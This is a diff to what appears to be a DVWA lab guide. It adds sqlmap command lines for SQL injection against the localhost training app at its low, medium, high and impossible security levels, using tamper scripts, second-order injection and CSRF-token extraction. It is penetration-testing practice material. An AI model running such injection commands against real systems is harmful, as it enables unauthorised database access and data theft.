@@ -192,7 +192,49 @@ python3 scripts/sqlmap_auto.py -u "http://localhost/dvwa/vulnerabilities/sqli/?i
   --dbms MySQL
 ```
 
-### 5.3 Manual Testing
+### 5.3 SQLMap Commands for Different Security Levels
+
+#### Low Security Level
+```bash
+sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
+--cookie="PHPSESSID=f4f8bd7a806d9c5bc733a4676647b1de    ; security=low" \
+--batch --dbs
+```
+
+#### Medium Security Level
+```bash
+sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/" \
+--cookie="PHPSESSID=f4f8bd7a806d9c5bc733a4676647b1de; security=medium" \
+--data="id=1&Submit=Submit" \
+--method POST \
+--random-agent \
+--risk 3 \
+--tamper=between,randomcase
+```
+
+#### High Security Level
+```bash
+sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/session-input.php" \
+--cookie="PHPSESSID=f4f8bd7a806d9c5bc733a4676647b1de; security=high; id=1" \
+-p id \
+--level=5 \
+--technique=Q \
+--prefix="' " \
+--suffix=" -- " \
+--second-order="http://localhost/dvwa/vulnerabilities/sqli/"
+```
+
+#### Impossible Security Level
+```bash
+sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/" \
+--cookie="PHPSESSID= f4f8bd7a806d9c5bc733a4676647b1de; security=impossible" \
+--csrf-token="user token" \
+--eval="from bs4 import BeautifulSoup; soup=BeautifulSoup(requests.get(url).text); token=soup.find('input', {'name':'user token'})['value']" \
+--tamper=base64encode \
+--proxy="http://127.0.0.1:8080"
+```
+
+### 5.4 Manual Testing
 1. Access DVWA in browser
 2. Set security level
 3. Test different parameters:
@@ -203,7 +245,7 @@ Example command to test DVWA SQL injection:
 ```bash
 ./scripts/payload_tester.sh -u http://localhost/dvwa/vulnerabilities/sqli/ -c "PHPSESSID=f500f9f7006f6596003d0ad3983048b0" -s low
 ```
-   - session parameters
+
 4. Use different payloads:
    - Generic SQLi
    - Blind SQLi
